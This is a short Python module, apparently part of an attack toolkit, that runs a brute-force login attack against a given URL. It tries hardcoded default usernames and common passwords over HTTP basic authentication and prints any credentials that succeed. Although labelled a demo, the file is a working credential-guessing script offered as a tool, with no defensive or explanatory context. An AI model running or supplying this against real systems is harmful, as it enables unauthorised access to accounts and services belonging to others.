# core/brute_force.py
import requests

def start_brute_force(target_url):
    print(f"[*] Starting brute-force attack on {target_url} (Demo)")

    usernames = ["admin", "user", "test"]
    passwords = ["123456", "password", "admin123"]

    for username in usernames:
        for password in passwords:
            try:
                response = requests.get(target_url, auth=(username, password), timeout=5)
                if response.status_code == 200:
                    print(f"[+] Success! Credentials found: {username}:{password}")
                    return
                else:
                    print(f"[-] Attempt failed: {username}:{password}")
            except Exception as e:
                print(f"[!] Error: {e}")

    print("[!] Brute-force completed, no valid credentials found.")
